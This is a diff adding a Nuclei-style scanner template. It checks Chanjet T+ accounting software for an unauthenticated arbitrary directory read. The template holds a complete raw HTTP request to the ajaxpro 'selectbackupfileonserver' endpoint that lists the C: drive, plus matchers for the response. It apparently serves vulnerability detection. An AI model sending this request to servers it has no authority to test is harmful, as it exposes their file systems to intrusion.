@@ -1,0 +1,32 @@
+id: changjieXT-App_Web_selectbackupfileonserver-file
+
+info:
+  name: 畅捷通T+ 存在任意目录读取漏洞
+  author: changjieXT
+  severity: medium
+  tags: changjieXT
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/ASP.sm_setupaccount_versionupdate_selectbackupfileonserver_aspx,App_Web_selectbackupfileonserver.aspx.1cbd2a00.ashx?method=LoadTreeNode HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Content-Type: text/plain; charset=UTF-8
+
+        {"backpath":"c:"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Windows'
+          - 'ProgramData'
+          - 'Program Files'
+        condition: and
+      - type: status
+        status:
+          - 200
